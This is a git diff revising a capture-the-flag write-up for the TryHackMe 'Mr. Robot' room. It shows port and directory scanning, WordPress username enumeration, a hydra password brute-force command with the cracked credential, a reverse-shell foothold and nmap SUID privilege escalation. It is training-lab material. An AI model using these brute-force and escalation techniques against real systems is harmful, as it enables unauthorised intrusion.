@@ -2,19 +2,23 @@
 title: "Mr. Robot"
 description: "Based on the Mr. Robot show, can you root this box?"
 author: "tryhackme"
-date: "2023-05-09"
+date: "2023-04-09"
 published: true
+tags: ["capture the flag", "tryhackme", "web", "networks"]
 ---
 
-# mr robot
+# Mr. Robot
 
-[challenge page](https://tryhackme.com/room/mrrobot)
+<aside>
+<strong>Description</strong>: Based on the Mr. Robot show, can you root this box?
+</aside>
+<br>
 
-## enumeration
+## Recon
 
-We can start by running some enumeration on open ports with `nmap`:
+I start by using `nmap` to enumerate open ports with `nmap`:
 
-> `nmap -sC -sV nmap-init 10.10.190.225 -vv`:
+`nmap -sC -sV nmap-init 10.10.190.225 -vv`:
 
 ```bash
 PORT    STATE  SERVICE  REASON         VERSION
@@ -54,7 +58,7 @@ PORT    STATE  SERVICE  REASON         VERSION
 
 We can also enumerate directories with a wordlist while investigating the HTTP service in a browser.
 
-> `gobuster dir -u http://10.10.190.225/ -w ../../../tools/dirlists/directory-list-2.3-medium.txt -x html,js,css,txt,php -t 20 --retry`
+`gobuster dir -u http://10.10.190.225/ -w ../../../tools/dirlists/directory-list-2.3-medium.txt -x html,js,css,txt,php -t 20 --retry`
 
 ```bash
     /#....
@@ -90,9 +94,10 @@ We can also enumerate directories with a wordlist while investigating the HTTP s
     /#...
 ```
 
-Generally speaking, the root directory doesn't contain anything interesting.
+The root directory on this box doesn't contain anything interesting.
 
-Instead, we can turn to our `gobuster` scan, where we see a `robots.txt` and directories for a Wordpress CMS backend. The `robots.txt` gives us the filepath for our first flag (`http://10.10.190.225/key-1-of-3.txt`), and a filepath for `fsocity.dic`; which is a long list of words. This turns out to be a list we can use to use to enumerate logins.
+Instead, we can turn to our `gobuster` scan, where we see a `robots.txt` and directories for a Wordpress CMS backend. The `robots.txt` gives us the filepath for our first flag
+(`http://10.10.190.225/key-1-of-3.txt`), and a filepath for `fsocity.dic`; which is a long list of words. This turns out to be a list we can use to use to enumerate logins.
 
 On `/wp-login.php`, we are able to check existing users through the "Lost your password?" link - entering an incorrect username will inform us that the username is incorrect.
 turning back to our `fsocity.dic`, i noted that there were a lot of duplicate entries; if i wanted to use this list to perform enumeration, it would make it much quicker to cut this down to unique entries only.
@@ -107,7 +112,7 @@ with open("fsociety_uniquelines.txt", "w") as f:
         f.write(line)
 ```
 
-This shrunk it considerably - from 858,160 entries down to 11,451 entries. Using burp, we see that a POST request with a non-existant username gives a div with `id='login_error'`, which we can use to invalidate a username:
+This shrunk it considerably - from 858,160 lines to just 11,451. We can see that a POST request with a non-existant username yields a div with `id='login_error'`, which we can use to invalidate a username's existance:
 
 ```html
 <div id="login_error">
@@ -115,7 +120,7 @@ This shrunk it considerably - from 858,160 entries down to 11,451 entries. Using
 </div>
 ```
 
-## foothold
+## Foothold
 
 Using this information as well as the headers from this request, I wrote a (kind of janky) python script using pwntools that will query the login page, using the filtered `fsociety.dic` as a wordlist:
 
@@ -172,7 +177,7 @@ print(f'completed with {total_requests} total requests, and {invalid_responses} 
 print(f'possible usernames: {possible_hits}')
 ```
 
-This could also be done (far quicker and easier) using Hydra.
+This could also be done (far quicker and easier) using Hydra, plus this python script seemed to have killed the (often frustratingly sensitive) THM machine.
 
 Regardless, we get multiple hits for case variations on `elliot`, which likely means the login form is not case sensitive (if it was, we could add them to a file and iterate the file with hydra instead):
 
@@ -181,7 +186,7 @@ completed with 11451 total requests, and 11448 invalid username requests.
 possible usernames: ['ELLIOT', 'Elliot', 'elliot']
 ```
 
-Manually trying any of these users returns the following error:
+After restarting the server, we can manually trying any of these users to validate that we didn't get random false positives:
 
 ```html
 <body id="error-page">
@@ -190,13 +195,13 @@ Possible reason: your host may have disabled the mail() function.</p>
 </body>
 ```
 
-This indicates that `elliot` is a valid username, and it seems like the form is case-insensensitive. We can now use Hydra to enumerate the password from the same file on the login page:
+We can now use Hydra to enumerate the password from the same file on the login page, which gives us a hit on elliot's password:
 
-`hydra -l elliot -P ./fsociety_uniquelines.txt 10.10.190.225 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
+```bash
+$ hydra -l elliot -P ./fsociety_uniquelines.txt 10.10.190.225 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 
-The THM machines are sensitive to receiving loads of requests like this so I probably killed the box with the python script,but after enumerating with the above command, we get a hit on elliot's password:
+# ...
 
-```
 [80][http-post-form] host: 10.10.218.32   login: elliot   password: ER28-0652
 ```
 Logging into the dashboard and poking around, like most CMS challenges, we likely want to look for a way to get a reverse shell callback. We can't upload files with a `.php` extension, but we can edit some of the
@@ -245,7 +250,7 @@ Going over the results, we quickly see the `suid` bit is set on the `nmap` binar
 ```sh
 -rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
 ```
-## privesc
+## Privilege Escalation
 
 Taking a quick look at [the nmap page on gtfobins](https://gtfobins.github.io/gtfobins/nmap/#suid), we see that `nmap` versions `2.02` to `5.21` have an interactive mode, and can be used to execute shell commands:
 
